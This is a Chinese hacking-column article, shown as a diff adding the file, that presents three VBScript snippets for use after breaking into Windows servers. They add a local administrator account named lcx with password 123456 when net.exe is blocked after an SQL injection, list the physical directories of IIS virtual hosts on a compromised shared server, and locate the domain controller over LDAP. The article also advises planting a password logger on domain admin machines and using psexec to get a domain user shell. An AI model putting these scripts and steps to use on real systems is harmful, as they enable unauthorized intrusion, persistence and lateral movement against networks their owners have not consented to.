@@ -1,0 +1,55 @@
+在入侵渗透中用过的3则VBS代码
+
+
+zzzevazzz 在他的名篇<<深入挖掘Windows脚本技术>>的结语中说到：“Windows脚本就像万能胶，能够把独立的程序、服务、控件组合起来完成任务。脚本编程的技巧就是组合的技巧。XP和2003比2000自带更多的命令行工具，WMI也大大加强了，脚本的功能水涨船高，可以说是 ‘只有想不到，没有做不到’，一切有待你的发掘。”这话很有道理，如果只把VBS看作是一个编程工具，用作写一些方便自己的小工具，对我们学入侵的人来讲则有点浪费其才能了。vbs简单易用，在入侵中用到好的话，会有意想不到的效果，这期就把我日常自己写自己用的三则vbs代码以飨读者。
+
+一、用VBS来加管理员帐号
+
+经常看到有人在论坛上讨论，在注入过程中明明有了sa帐号，但是由于net.exe和net1.exe被限制，或其它的不明原因，总是加不了管理员帐号。 VBS在活动目录（adsi）部份有一个winnt对像，可以用来管理本地资源，可以用它不依靠cmd等命令来加一个管理员，详细代码如下：
+
+★
+set wsnetwork=CreateObject("Wscript.NETWORK")
+os="WinNT://"&wsnetwork.ComputerName
+Set ob=GetObject(os) ’得到adsi接口,绑定
+Set oe=GetObject(os&"/Administrators,group") ’属性,admin组
+Set od=ob.Create("user","lcx") ’建立用户
+od.SetPassword "123456" ’设置密码
+od.SetInfo ’保存
+Set of=GetObject(os&"/lcx",user) ’得到用户
+oe.add os&"/lcx"
+★
+
+这段代码如果保存为1.vbs，在cmd下运行，格式: ●cscript 1.vbs●的话，会在当前系统加一个名字为lcx，密码为123456的管理员。当然，你可以用记事本来修改里边的变量lcx和123456，改成你喜欢的名字和密码值。
+
+二、用vbs来列虚拟主机的物理目录
+
+有时旁注入侵成功一个站，拿到系统权限后，面对上百个虚拟主机，怎样才能更快的找到我们目标站的物理目录呢？一个站一个站翻看太累，用系统自带的adsutil.vbs吧又感觉好像参数很多，有点无法下手的感觉，试试我这个脚本吧，代码如下：
+
+★
+Set ObjService=GetObject("IIS://LocalHost/W3SVC")
+For Each obj3w In objservice
+If IsNumeric(obj3w.Name) Then
+sServerName=Obj3w.ServerComment
+Set webSite = GetObject("IIS://Localhost/W3SVC/" & obj3w.Name & "/Root")
+ListAllWeb = ListAllWeb & obj3w.Name & String(25-Len(obj3w.Name)," ") & obj3w.ServerComment & "(" & webSite.Path & ")" & vbCrLf
+
+End If
+Next
+Wscript.Echo ListAllWeb
+Set ObjService=Nothing
+Wscript.Quit
+★
+
+运行●cscript 2.vbs●后，就会详细列出IIS里的站点ID、描述、及物理目录，是不是代码少很多又方便呢？
+
+三、快速找到内网域的主服务器
+
+面对域结构的内网，可能许多小菜没有经验如何去渗透。如果你能拿到主域管理员的密码，整个内网你就可以自由穿行了。主域管理员一般呆在比较重要的机器上，如果能搞定其中的一台或几台，放个密码记录器之类，相信总有一天你会拿到密码。主域服务器当然是其中最重要一台了，如何在成千台机器里判断出是哪一台呢？dos命令像●net group "domain admins" /domain●可以做为一个判断的标准，不过vbs也可以做到的，这仍然属于adsi部份的内容，代码如下：
+★
+set obj=GetObject("LDAP://rootDSE")
+wscript.echo obj.servername
+★
+
+只用这两句代码就足够了，运行●cscript 3.vbs●，会有结果的。当然，无论是dos命令或vbs，你前提必须要在域用户的权限下。好比你得到了一个域用户的帐号密码，你可以用 psexec.exe -u -p cmd.exe这样的格式来得到域用户的shell，或你的木马本来就是与桌面交互的，登陆你木马shell的又是域用户，就可以直接运行这些命令了。
+
+vbs的在入侵中的作用当然不只这些，当然用js或其它工具也可以实现我上述代码的功能；不过这个专栏定下的题目是vbs在hacking中的妙用，所以我们只提vbs。写完vbs这部份我和其它作者会在以后的专栏继续策划其它的题目，争取为读者带来好的有用的文章。
